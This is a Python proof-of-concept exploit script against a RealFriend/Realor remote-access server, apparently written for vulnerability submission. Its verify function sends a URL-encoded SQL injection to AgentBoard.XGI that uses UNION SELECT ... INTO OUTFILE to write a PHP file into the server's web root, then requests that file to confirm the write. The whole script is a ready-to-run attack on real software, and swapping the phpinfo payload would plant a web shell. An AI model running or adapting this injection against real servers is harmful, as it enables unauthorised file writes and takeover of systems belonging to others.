#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec


import requests
import urllib3
import sys
import time
import json
import re

urllib3.disable_warnings()



def verify(site):
    burp0_url = site +  "/AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5CAppListwe.XGI%22+--+-&cmd=UserLogin"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2762.73 Safari/537.36"}
    r1 = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if r1.status_code ==200:
        poc_url = site + '/AppListwe.XGI'
        poc_vul = requests.get(url=poc_url, headers=burp0_headers, verify=False)
        if poc_vul.status_code == 200:
            return poc_url
    return ""

if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Windows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 realor-gwt-system-sql-injection.py ",target)
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，利用 SQL 注入写入 php info 的路径为：", info)
    else:
        print("[-]漏洞不存在")
